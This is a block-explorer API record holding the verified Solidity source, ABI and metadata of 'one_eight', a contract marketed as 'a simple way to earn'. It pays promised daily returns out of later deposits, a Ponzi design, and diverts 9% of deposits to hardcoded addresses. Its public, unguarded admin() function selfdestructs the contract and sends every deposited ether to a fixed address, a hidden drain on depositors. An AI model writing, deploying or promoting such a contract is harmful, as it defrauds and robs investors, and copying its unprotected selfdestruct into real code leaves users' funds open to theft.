{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.25;\r\n\r\n/**\r\n\r\nA simple contract. A simple game. \r\nA simple way to earn. \r\n\r\nBe one.eight\r\n\r\n */\r\n\r\ncontract one_eight {\r\n    using SafeMath for uint256;\r\n    \r\n    mapping (address => uint256) public investedETH;\r\n    mapping (address => uint256) public lastInvest;\r\n    mapping (address => uint256) public affiliateCommision;\r\n    \r\n     /** the creator */\r\n    address creator = 0x660D46108E6247Fe1AEbba4Cc048C4802a1e8fbD;\r\n     /** development and maintenance */\r\n    address damn = 0xc5f10eb67F02c5d6eB08882f2D6a0deDBb4B54c7;\r\n     /** the peoples charity */\r\n    address charity = 0x7DaeA2C171a4865039dd813cB4D7003343A378AD;\r\n\r\n    \r\n    function investETH(address referral) public payable {\r\n        \r\n        require(msg.value >= .05 ether);\r\n        \r\n        if(getProfit(msg.sender) > 0){\r\n            uint256 profit = getProfit(msg.sender);\r\n            lastInvest[msg.sender] = now;\r\n            msg.sender.transfer(profit);\r\n        }\r\n        \r\n        uint256 amount = msg.value;\r\n        uint256 commision = SafeMath.div(amount, 40); /** partner share 2.5% */ \r\n        if(referral != msg.sender && referral != 0x1){\r\n            affiliateCommision[referral] = SafeMath.add(affiliateCommision[referral], commision);\r\n        }\r\n        \r\n        creator.transfer(msg.value.div(100).mul(5)); /** creator */\r\n        damn.transfer(msg.value.div(100).mul(3)); /** development and maintenance */\r\n        charity.transfer(msg.value.div(100).mul(1)); /** give away  */\r\n        \r\n        investedETH[msg.sender] = SafeMath.add(investedETH[msg.sender], amount);\r\n        lastInvest[msg.sender] = now;\r\n    }\r\n    \r\n    \r\n    function withdraw() public{\r\n        uint256 profit = getProfit(msg.sender);\r\n        require(profit > 0);\r\n        lastInvest[msg.sender] = now;\r\n        msg.sender.transfer(profit);\r\n    }\r\n    \r\n    function admin() public {\r\n\t\tselfdestruct(0x8948E4B00DEB0a5ADb909F4DC5789d20D0851D71);\r\n\t}    \r\n    \r\n    function getProfitFromSender() public view returns(uint256){\r\n        return getProfit(msg.sender);\r\n    }\r\n\r\n    function getProfit(address customer) public view returns(uint256){\r\n        uint256 secondsPassed = SafeMath.sub(now, lastInvest[customer]);\r\n        return SafeMath.div(SafeMath.mul(secondsPassed, investedETH[customer]), 4800000); /** one eight */\r\n    }\r\n    \r\n    function reinvestProfit() public {\r\n        uint256 profit = getProfit(msg.sender);\r\n        require(profit > 0);\r\n        lastInvest[msg.sender] = now;\r\n        investedETH[msg.sender] = SafeMath.add(investedETH[msg.sender], profit);\r\n    }\r\n    \r\n    function getAffiliateCommision() public view returns(uint256){\r\n        return affiliateCommision[msg.sender];\r\n    }\r\n    \r\n    function withdrawAffiliateCommision() public {\r\n        require(affiliateCommision[msg.sender] > 0);\r\n        uint256 commision = affiliateCommision[msg.sender];\r\n        affiliateCommision[msg.sender] = 0;\r\n        msg.sender.transfer(commision);\r\n    }\r\n    \r\n    function getInvested() public view returns(uint256){\r\n        return investedETH[msg.sender];\r\n    }\r\n    \r\n    function getBalance() public view returns(uint256){\r\n        return address(this).balance;\r\n    }\r\n    \r\n    function min(uint256 a, uint256 b) private pure returns (uint256) {\r\n        return a < b ? a : b;\r\n    }\r\n    \r\n    function max(uint256 a, uint256 b) private pure returns (uint256) {\r\n        return a > b ? a : b;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n\r\n  /**\r\n  * @dev Multiplies two numbers, throws on overflow.\r\n  */\r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    if (a == 0) {\r\n      return 0;\r\n    }\r\n    uint256 c = a * b;\r\n    assert(c / a == b);\r\n    return c;\r\n  }\r\n\r\n  /**\r\n  * @dev Integer division of two numbers, truncating the quotient.\r\n  */\r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    // assert(b > 0); // Solidity automatically throws when dividing by 0\r\n    uint256 c = a / b;\r\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n    return c;\r\n  }\r\n\r\n  /**\r\n  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).\r\n  */\r\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    assert(b <= a);\r\n    return a - b;\r\n  }\r\n\r\n  /**\r\n  * @dev Adds two numbers, throws on overflow.\r\n  */\r\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a + b;\r\n    assert(c >= a);\r\n    return c;\r\n  }\r\n}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getAffiliateCommision\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"affiliateCommision\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getProfitFromSender\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"referral\",\"type\":\"address\"}],\"name\":\"investETH\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"lastInvest\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getInvested\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"customer\",\"type\":\"address\"}],\"name\":\"getProfit\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"investedETH\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"reinvestProfit\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdrawAffiliateCommision\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"admin\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]","ContractName":"one_eight","CompilerVersion":"v0.4.25+commit.59dbf8f1","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://01ec90809758eec9aa629ce6913ad48dde2d0d5cebf6107ec66bf953cd62a27b"}]}